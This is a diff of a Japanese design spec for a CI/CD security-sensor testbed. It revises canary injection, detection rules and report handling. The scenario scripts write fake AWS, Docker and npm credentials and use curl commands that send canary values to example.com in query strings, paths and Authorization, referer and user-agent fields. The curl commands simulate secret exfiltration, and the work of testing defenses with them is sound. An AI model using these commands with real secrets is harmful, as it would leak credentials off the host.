@@ -188,6 +188,31 @@ HTTP の path/host（`domains` にはホスト名のみ）を一切含まない�
 | `note <msg>` | 実行した操作を `$TESTBED_LOG`（JSONL）に記録する |
 | `safe_run <cmd...>` | 失敗を許容してコマンドを実行し、終了コードを記録 |
 
+### argv カナリアの注入箇所（実装時の注入箇所。レビューで見つかった仕様の穴への対応）
+
+`canaries/canaries.env` で `CANARY_ARGV_SHORT` / `CANARY_ARGV_LONG` /
+`CANARY_ARGV_FLAG` を定義していたが、当初の本節にはこれらを**実際にどの
+シナリオがどう argv に載せるか**の規定が無かった（`CANARY_ARGV_FLAG` だけが
+`02-exfil.sh` の `Authorization: Bearer` ヘッダで使われており、
+`CANARY_ARGV_SHORT` / `CANARY_ARGV_LONG` はどのシナリオでも未使用だった）。
+これが「argv にカナリアを埋めても見つからない」という問題の真因の一つ
+だった（もう一つの真因は §5 で追記する「ルール不一致イベントは記録され
+ない」という仕様。両方が揃わないと argv 経由の漏洩は観測できない）。
+
+| カナリア | 注入箇所 | 形式 |
+| --- | --- | --- |
+| `CANARY_ARGV_SHORT` | `02-exfil.sh` の curl 呼び出し | `--referer "${CANARY_ARGV_SHORT}"`（値そのものが独立した argv 要素） |
+| `CANARY_ARGV_LONG` | 同上 | `-A "${CANARY_ARGV_LONG}"`（同上） |
+| `CANARY_ARGV_FLAG` | `02-exfil.sh` の curl 呼び出し（既存） | `-H "Authorization: Bearer ${CANARY_ARGV_FLAG}"` |
+
+`--referer` / `-A` を選んだ理由: 値がクエリ文字列やヘッダ値の一部分では
+なく、curl プロセスの実 argv でそれ自体が1つの配列要素になるため
+（bash の単語分割により `--referer` と値が別々の argv 要素として execve に
+渡る）。「12 バイト以下の argv は切り詰められない」
+（`CANARY_ARGV_SHORT`）／「13 バイト以上は `<truncated, N bytes>` になる」
+（`CANARY_ARGV_LONG`）という仮説を、他の要素との結合に左右されずに検証
+できる。通信先は他のステップと同じ `http://example.com/` のみ。
+
 ### `00-seed.sh`
 
 後続シナリオが読む「偽クレデンシャル」を配置する。
@@ -195,6 +220,9 @@ HTTP の path/host（`domains` にはホスト名のみ）を一切含まない�
 - `~/.aws/credentials` に `CANARY_FILE` を含む偽の AWS 認証情報を書く
 - `~/.docker/config.json` に偽の auth エントリを書く
 - `/tmp/${CANARY_PATH}/marker` を作る（ディレクトリ名にカナリアを含める）
+- `/tmp/${CANARY_PATH}/canary-path-probe.marker` を作る（§5 の
+  `testbed_canary_path_probe` ルールを発火させる専用の観測用マーカー。
+  上の `marker` とは別ファイル）
 - `~/.npmrc` に偽の registry トークン行を書く
 
 ### `01-credential-access.sh` — クレデンシャルアクセス
@@ -213,6 +241,13 @@ HTTP の path/host（`domains` にはホスト名のみ）を一切含まない�
 - 平文 HTTP（クエリ）: `curl -s -m 5 "http://example.com/?t=${CANARY_URL_QUERY}"`
 - 平文 HTTP（パス）: `curl -s -m 5 "http://example.com/${CANARY_URL_PATH}"`
 - 平文 HTTP（Authorization ヘッダ）: `curl -s -m 5 -H "Authorization: Bearer ${CANARY_ARGV_FLAG}" http://example.com/`
+- **argv カナリア（独立した argv 要素）**:
+  `curl -s -m 5 --referer "${CANARY_ARGV_SHORT}" -A "${CANARY_ARGV_LONG}" http://example.com/`
+  → `CANARY_ARGV_SHORT` / `CANARY_ARGV_LONG` を、クエリ文字列やヘッダ値の
+  一部としてではなく、それ自体で1つの argv 配列要素として渡す
+  （レビューで見つかった仕様の穴: 以前はこの2つの値がどのシナリオにも
+  argv として注入されておらず、「argv にカナリアを埋めても検知できない」
+  という問題の真因の一つだった。§4「実装時の注入箇所」参照）
 - HTTPS 対照群: `curl -s -m 5 "https://example.com/?t=${CANARY_URL_QUERY}"`
   → **HTTPS 側は中身が取れないことの確認用**。これが取れていたら報告の前提が崩れる
 
@@ -289,6 +324,41 @@ monitor_mode: true
 default_max_alerts_per_rule: 50
 ```
 
+### 前提：cicd-sensor はルールに一致したイベントの詳細しか記録しない（実地実行 run 32510077347 で確認）
+
+**この前提が §3〜§7 全体の設計を左右する、最重要の事実である。**
+実物の HTML レポート（standalone モード、run 32510077347）を解析した結果、
+次が判明した。
+
+- レポートの `hits[]`（ルールに一致したイベント）の各要素は `process`
+  （`pid` / `exec_path` / `argv` / `ancestors`）と `payload`（`file_open`
+  なら `path` / `flags` / `is_read` / `is_write` 等）を**完全に持つ**
+- しかし **ルールに一致しなかったイベントは一切記録されない**。
+  standalone モードには「生のイベントストリーム」に相当するものが存在しない
+- `domain_observations[]` / `network_connections[]`
+  （ルール一致に関係なく載る、集計寄りの補助配列）は `exec_path` と
+  `ancestors` を持つが、**`argv` を持たない**
+
+つまり、**カナリアを argv・パス・HTTP path/query に埋め込んでも、
+そのイベントを生成したプロセス／通信が何らかのルールに一致しない限り、
+レポートに一切現れない。** 「カナリアが見つからない」という以前の観測は、
+漏洩しなかったことの証拠ではなく、単に「その値を運ぶイベントを見る場所が
+レポート中に無かった」ことの証拠だった。
+
+この事実への対応として、下の `cicd_runtime_testbed/canary_observability`
+ruleset を追加した。すべて `action: collect`（ジョブを止めない、
+Detection Log に載るだけ）の自己完結ルールで、実在の IOC には依存しない。
+
+| rule_id | event_type | 条件の方針 | 捕捉する内容 |
+| --- | --- | --- | --- |
+| `testbed_canary_argv_carrier` | `process_exec` | `process.exec_path.endsWith("/curl")` | `02-exfil.sh` の curl 実行全般。ヒットの `process.argv` を通じて `CANARY_ARGV_SHORT` / `CANARY_ARGV_LONG` / `CANARY_ARGV_FLAG` が観測できる |
+| `testbed_canary_path_probe` | `file_open` | `is_write && path.endsWith("/canary-path-probe.marker")` | `00-seed.sh` が `/tmp/${CANARY_PATH}/` 配下に作る専用マーカーへの書き込み。ヒットの `payload.path` に `CANARY_PATH` の値（ディレクトリ名）が現れる |
+| `testbed_canary_http_host` | `http_request` | `host == "example.com"` | `02-exfil.sh` の平文 HTTP リクエスト。ヒットの `payload.path` を通じて `CANARY_URL_PATH` が観測できる（`payload` に query は含まれない仕様のため、`CANARY_URL_QUERY` が「除去された」ことの確認にもなる） |
+
+`domain`（`CANARY_DNS`）については、`domain_observations[]` がルール一致に
+関係なく載る（§3「観測に必要な証跡粒度」参照）ため、専用の観測用ルールは
+追加していない。
+
 ### `.cicd-sensor/rules/testbed.yaml`
 
 kill を発火させる専用ルール。**実在の IOC は使わない。**
@@ -306,10 +376,16 @@ CEL の制約に注意:
 | `testbed_kill_marker` | `file_open` | `is_write && path.endsWith("/cicd-sensor-killme.marker")` | `terminate` |
 | `testbed_detect_marker` | `file_open` | `is_write && path.endsWith("/cicd-sensor-detect.marker")` | `detect` |
 | `testbed_collect_marker` | `file_open` | `is_write && path.endsWith("/cicd-sensor-collect.marker")` | `collect` |
+| `testbed_canary_argv_carrier` | `process_exec` | `process.exec_path.endsWith("/curl")` | `collect` |
+| `testbed_canary_path_probe` | `file_open` | `is_write && path.endsWith("/canary-path-probe.marker")` | `collect` |
+| `testbed_canary_http_host` | `http_request` | `host == "example.com"` | `collect` |
 
 `90-killme.sh` は `cicd-sensor-killme.marker` に書き込むだけでよい。
 `cicd-sensor-detect.marker` / `cicd-sensor-collect.marker` は
-`07-rule-markers.sh`（§4）が書き込む。
+`07-rule-markers.sh`（§4）が書き込む。下の3ルール
+（`testbed_canary_argv_carrier` / `testbed_canary_path_probe` /
+`testbed_canary_http_host`）はカナリア観測専用で、上記「前提」節を
+参照。
 
 検証は `cicd-sensorctl rule validate .cicd-sensor/rules` で行なう。ワークフローにこの検証ステップを含めること。
 
@@ -371,6 +447,24 @@ HTML レポートの 2 種類に限られる。**個別イベント（timestamp 
 このため §3「観測に必要な証跡粒度」で「詳細以上」と指定されたカナリアは、
 predicate しか無い状況では原理的に観測できない。§7 の N/A 判定を参照。
 
+### アーティファクト名（実地実行 run 32510077347 で判明した不一致への対応）
+
+`cicd-sensor-action` が standalone モードでアップロードする HTML レポートの
+アーティファクト名は **`cicd-sensor-report.html`** である（`gh api
+repos/<owner>/<repo>/actions/runs/<run_id>/artifacts` で実際に確認済み）。
+以前の `sensor-monitor.yml` / `sensor-enforce.yml` は `name: cicd-sensor-report`
+（拡張子なし）でダウンロードしようとしており、これは実際のアーティファクト名と
+一致しないため常に失敗していた（`continue-on-error: true` により黙って
+`telemetry-manifest.txt` に `MISSING` と記録されるだけだった）。
+`cicd-sensor-attestation` の名前は元から正しい。
+
+ワークフロー内でこのダウンロード対象アーティファクト名を
+`cicd-sensor-report.html` に修正した。一方、ダウンロード後の**ローカルの
+展開先フォルダ名**（`path: telemetry/cicd-sensor-report`）は意図的に
+変更していない。`tools/render-matrix.py` の証跡粒度判定はこのローカルの
+フォルダ名（basename）に一致させて HTML レポートの有無を判定しており、
+GitHub 上のアーティファクト識別名とは独立した概念であるため。
+
 ### collect-telemetry ジョブの完全性
 
 `sensor-monitor.yml` / `sensor-enforce.yml` の collect-telemetry ジョブ、および
@@ -407,6 +501,7 @@ predicate しか無い状況では原理的に観測できない。§7 の N/A �
   "scanned_at": "2026-08-19T12:00:00Z",
   "run_id": "1234567890",
   "scan_root": "downloaded-artifacts",
+  "telemetry_dirs": ["telemetry-cicd-sensor-monitor"],
   "scanned_file_count": 0,
   "canary_match_mode": "case_insensitive",
   "findings": [
@@ -438,6 +533,13 @@ predicate しか無い状況では原理的に観測できない。§7 の N/A �
 - `scanned_file_count` は実際に走査した候補ファイル数（`CANDIDATE_FILES` の件数）を記録する。
   `render-matrix.py` はこの値を使って「走査対象 0 件」（＝テスト不成立）を
   「期待と実測の乖離」と区別する（後述）。
+- `telemetry_dirs` は、走査対象ディレクトリ（`scan_root`）の**直下**にある
+  ディレクトリ名の一覧（例: `["telemetry-cicd-sensor-monitor"]`）。
+  `render-matrix.py` のツール種別判定（下記「対象外（N/A）判定」参照）は
+  この値を優先して使うことで、`render-matrix.py` を実行する時点で
+  `scan_root` に実際にファイルシステムアクセスできるかどうかに判定結果が
+  左右されなくなる。つまり `leak-report.json` 単体（＝スキャン実行時と
+  異なる環境・異なるカレントディレクトリ）でも再現可能な判定になる。
 - **カナリアの実値を `leak-report.json` に書かないこと**（スキャナ出力自体が漏洩源になるため）。
   `canary_id` のみ記録する。
 - `canary_match_mode` は `findings`（カナリア本走査）が大文字小文字非依存
@@ -521,8 +623,9 @@ predicate しか無い状況では原理的に観測できない。§7 の N/A �
 食い違った（発見）」ではなく「そもそも判定できない組み合わせ（対象外）」であり、
 他のカナリアと同じ ⚠️ にしてはいけない。
 
-- `render-matrix.py` は `leak-report.json` の `scan_root` 直下のディレクトリ名から、
-  走査対象に含まれるツールの種別を判定する
+- `render-matrix.py` は `leak-report.json` の `telemetry_dirs`
+  （無ければ `scan_root` 直下のディレクトリ名を `os.listdir` で取得した
+  フォールバック）から、走査対象に含まれるツールの種別を判定する
   （`telemetry-cicd-sensor-*` → cicd-sensor、`telemetry-falco-*` → falco。
   実際のアーティファクト名は §8 参照）。
 - 走査対象に、あるカナリアの「適用範囲」（§3）に含まれるツールのテレメトリが
@@ -530,11 +633,23 @@ predicate しか無い状況では原理的に観測できない。§7 の N/A �
   乖離件数にも exit code にも算入しない。
 - マトリクスの冒頭に、今回走査したテレメトリの種別（判定できた場合）または
   「判定不能」（後述）を明記する。読み手が「なぜ N/A なのか」を理解できるようにするため。
-- `scan_root` にアクセスできない場合（ディレクトリが既に存在しない、
+- **ツール種別が判定不能な場合のフォールバック**: `telemetry_dirs` が無く、
+  かつ `scan_root` にアクセスできない場合（ディレクトリが既に存在しない、
   `leak-report.json` だけを後から別環境で読む場合等）や、直下のディレクトリ名が
-  既知の `telemetry-*` パターンに一つも一致しない場合は、**判定不能として扱い、
-  安全側に倒して全カナリアを判定対象にする**（N/A で見逃すより、⚠️ で気づける方が
-  良いため）。
+  既知の `telemetry-*` パターンに一つも一致しない場合は、判定不能として扱う。
+  この場合の扱いはカナリアの「適用範囲」（§3）によって異なる。
+  - **両方のツールに適用されるカナリア**（`CANARY_SCAP` 以外の全て）は、
+    ツール種別が判定できなくてもどのみち判定対象になるので、
+    通常どおり判定する（安全側に倒して見逃さないため）。
+  - **ツール固有のカナリア**（現状 `CANARY_SCAP` のみ、falco 固有）は、
+    ツール種別が判定できない以上「そのツールのテレメトリを見ているか」を
+    確認しようがないため、**N/A（対象外）** と表示し、乖離件数にも
+    exit code にも算入しない。
+    以前の実装は「安全側に倒して全カナリアを判定対象にする」だったが、
+    これは cicd-sensor 単独の run（`capture.scap` が存在しない）を
+    走査した際に判定不能となった場合、`CANARY_SCAP` が
+    `found=false` vs `expected=leak` で必ず ⚠️（exit 1）になる誤検知を
+    生んでいた。ツール固有カナリアに限って N/A に倒すことでこれを解消する。
 
 #### 対象外（N/A）判定：証跡の粒度によるカナリアの絞り込み（実地実行 run 32381640678 で追加）
 
